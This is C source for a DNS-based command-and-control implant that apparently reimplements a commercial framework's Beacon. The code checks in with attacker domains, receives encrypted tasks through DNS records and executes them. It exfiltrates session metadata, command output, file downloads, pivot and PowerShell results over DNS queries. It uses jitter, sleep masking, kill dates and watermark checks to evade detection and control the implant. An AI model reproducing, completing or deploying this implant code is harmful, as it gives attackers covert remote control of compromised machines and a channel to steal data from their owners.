#include <stdio.h>
#include "channel.h"
#include "commands.h"
#include "security.h"
#include "beacon.h"
#include "strategy.h"
#include "link.h"
#include "build.h"
#include "parse.h"
#include "bformat.h"
#include "track_memory.h"

#define MAX_GET setting_int(SETTING_MAXGET)

/* default, 1 minute time between beacons */
unsigned int sleep_time = 1000 * 30 * 1;

/* id for our beacon */
extern unsigned int agentid;

/* jitter, a value to alter sleep time with */
unsigned int jitter     = 0;

/* the URL where we will post data back to */
char         post_url[1024];

/* base64 encoded session metadata info */
extern sessdata bigsession;

char * dnsbeacon_putoutput;

unsigned int genagentid() {
	unsigned int result = bigger_rand() & 0x7FFFFFFF & ~1;

	/* a way to imprint "this is a DNS Beacon" into our random value */
	return result | 1202;
}

void command_shell_post(char * buffer, int length, int type, BOOL sendNow) {
	DWORD bar = 0;

	/* encrypt+package the data => must FREE this returned pointer */
	char * cipherdata = command_shell_encrypt(buffer, length, type, &bar);
	if (bar <= 0)
		return;

	/* handle the posting */
	dns_put(dnsbeacon_putoutput, post_url, cipherdata, bar);

	/* I, the caller, am responsible for freeing the command_shell_encrypt pointer! */
	free(cipherdata);
}

void command_shell_callback(char * buffer, int length, int type) {
	command_shell_post(buffer, length, type, FALSE);
}




void beacon(LPVOID lpReserved) {
	char * buffer;
	int    length;
	unsigned int adjust = 0;

	/* some of our metadata */
	datap * blob = data_alloc(128);  /* blob is tracked */
	char  * beacon_domain = data_ptr(blob, 128);
	int len = 128, ll = 1024;
	unsigned int signal;

	BOOL failedHost = FALSE;

	/* Keep track of the current state for the max retry strategy */
	int maxRetryCount = 0;
	unsigned int maxOrigSleepTime = 0;

	/* our various settings, need to be assigned from uh... somewhere */
	char * hosts           = setting_ptr(SETTING_DOMAINS);
	strategy_info strategyInfo; /* 与 beacon.cpp 同理：栈上分配即可（原 TODO 确认） */

	int    port = setting_short(SETTING_PORT);
	unsigned int sleepTime = setting_int(SETTING_SLEEPTIME);
	unsigned int dnsidle   = setting_int(SETTING_DNS_IDLE);

	char * dnsbeacon_beacon = setting_ptr(SETTING_DNS_BEACON_BEACON);
	char * dnsbeacon_putmetadata = setting_ptr(SETTING_DNS_BEACON_PUT_METADATA);
	dnsbeacon_putoutput = setting_ptr(SETTING_DNS_BEACON_PUT_OUTPUT);

	// dlog("dnsb - dnsbeacon_beacon:  %s\n", dnsbeacon_beacon);
	// dlog("dnsb - dnsbeacon_putmetadata:  %s\n", dnsbeacon_putmetadata);
	// dlog("dnsb - dnsbeacon_putoutput:  %s\n", dnsbeacon_putoutput);

	// dlog("beacon.beacon - Before Host Initialization: hosts: '%s' \n", hosts);

	strategy_setup(
		&strategyInfo,
		setting_short(SETTING_DOMAIN_STRATEGY),
		setting_int(SETTING_DOMAIN_STRATEGY_SECONDS),
		setting_int(SETTING_DOMAIN_STRATEGY_FAIL_SECONDS),
		setting_int(SETTING_DOMAIN_STRATEGY_FAIL_X));

	// dlog("dnsb.beacon - Strategy Initialized: strategy: '%d' rotation_timer: '%d' failover_timer: '%d' failover_maxfail: '%d' hosts: '%s' \n", strategyInfo->strategy, strategyInfo->rotation_timer, strategyInfo->failover_timer, strategyInfo->failover_maxfail, hosts);

	/* track the blob for cleanup and blob-original for masking */
	track_memory_add(blob, sizeof(datap), TRACK_MEMORY_CLEANUP_FUNC, FALSE, reinterpret_cast<void (*)(void*)>(data_free));
	track_memory_add(blob->original, blob->size, TRACK_MEMORY_CLEANUP_FUNC, TRUE, NULL);

	/* check the kill date */
	if (check_kill_date())
		safe_exit();

	/* 4.5+ - Validate watermark */
	if (bad_watermark())
		safe_exit();

	/* 4.5+ - Validate watermark hash */
	if (bad_watermarkHash())
		safe_exit();

	/* setup our sleep time */
	sleep_time = sleepTime;

	/* setup our default jitter factor */
	jitter = setting_short(SETTING_JITTER);

	/* allocate our buffers */
	buffer = (char *)malloc(MAX_GET);  /* This is cleared out in process_payload */
	if (buffer == NULL) {
		safe_exit();
	}
	track_memory_add(buffer, MAX_GET, TRACK_MEMORY_MALLOC, FALSE, NULL);

	/* initialize the agent */
	agent_init(buffer, MAX_GET);

	while (sleep_time > 0) {
		// dlog("dnsb.beacon - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n");

		/* setup how we're going to beacon back... */
		_snprintf(post_url, 1024, "%x.%s", agentid, next_host(hosts, failedHost, &strategyInfo));
		_snprintf(beacon_domain, 128, "%s%s", dnsbeacon_beacon, post_url);

		/* skip the embedded URI */
		failedHost = FALSE;
		next_host(hosts, failedHost, &strategyInfo);

		/* dnsidle is a value the user specifies as a replacement for the 0.0.0.0 IP 
		 * Beacon uses as a signal. We now XOR this value by any IPv4 related signal
		 * values. Why? Because we're trying to avoid IPv4 bogons as much as possible.
		 *
		 * 0x00000000 = do nothing
		 * 0x000000F? = use DNS to download stuff and send metadata
		 */
		if (channel_lookup(beacon_domain, &signal)) {
			/* restore... */
			signal = ntohl(signal) ^ dnsidle;

			if (signal == 0x0) {
				/* Zero signal: the TS does not have a session for us yet
				 * (a fresh TS process forgets every beacon). The official
				 * beacon carries its metadata to the TS through the query
				 * stream itself, so it registers within one cycle; our
				 * checkin query only carries the agent id, and waiting for
				 * a 0xF1 signal deadlocks (TS signals only sessions it
				 * knows). Break the loop: after three consecutive zero
				 * cycles, push one metadata upload. */
				static int zero_cycles = 0;
				if (++zero_cycles >= 3) {
					zero_cycles = 0;
					dns_put(dnsbeacon_putmetadata, post_url, bigsession.data, bigsession.length);
				}
			}
			else if ((signal & 0xFFFFFFF0) == 0xF0) {

				/* set our max dns length, based on the channel type, please! */
				set_max_dns(signal);

				/* did the signal indicate that we need to send metadata? */
				if ((signal & 0x01) == 0x01) {
					/* I will send ze metadata */
					dns_put(dnsbeacon_putmetadata, post_url, bigsession.data, bigsession.length);
				}

				/* get tasks over DNS plz */
				if ((signal & 0x2) == 0x2) {
					length = dns_get_txt(post_url, buffer, MAX_GET);
				}
				else if ((signal & 0x4) == 0x4) {
					length = dns_get6(post_url, buffer, MAX_GET);
				}
				else {
					length = dns_get(post_url, buffer, MAX_GET);
				}

				/* this is a timely place to decrypt and verify the payload before processing it */
				if (length > 0) {
					/* decrypt the buffer */
					length = security_decrypt(buffer, length);
					if (length > 0) {
						process_payload(buffer, length);
					}
				}
			}
			else {
				// dlog("dnsb.beacon - unknown signal? \n");
			}

			/* check our pivots... see if there is any data to report */
			pivot_poll(command_shell_callback);

			/* file downloads too?!? */
			download_poll(command_shell_callback, MAX_PACKET_DNS);

			/* report all links */
			link_poll(command_shell_callback);

			/* check our powershell instances */
			psh_poll(command_shell_callback, MAX_PACKET);
		}
		else {
			// Move on to a new host?
			// dlog("dnsb.beacon - Connection Failed: Hosts: %s \n", beacon_domain);
			failedHost = TRUE;
		}

		/* check the kill date */
		if (check_kill_date())
			command_die(command_shell_callback);

		/* check the kill date (again) */
		if (check_kill_date())
			safe_exit();

		/* check for max retry strategy, adjust sleep_time if threshold is met. */
		if (check_max_retry(failedHost, &maxRetryCount, &sleep_time, &maxOrigSleepTime))
			safe_exit();

		/* sleep for as long as we need to? */
		if (sleep_time > 0) {
			if (jitter == 0) {
				GargleSleep(sleep_time);
			}
			else {
			    unsigned int sxjd100 = ((sleep_time * jitter) / 100);
			    if (sxjd100 > 0) {
    				adjust = (bigger_rand() % sxjd100);
			    } else {
			        // when "sleep_time * jitter" is less than 100, sleep_time is too small to jitter.
    				adjust = 0;
			    }

    			// dlog("dnsb.beacon - Ready to GargleSleep! Sleep Time: %u Jitter: %u Adjustment: %u sxjd100: %u \n", sleep_time, jitter, adjust, sxjd100);
				if (adjust < sleep_time) {
					GargleSleep(sleep_time - adjust);
				} else {
				    // Not sure how we got here, but we should probably still try to sleep...
					GargleSleep(sleep_time);
				}
			}
		}
	}


	/* we exit the process--to keep the process we live in from "crashing" */
	safe_exit();
}
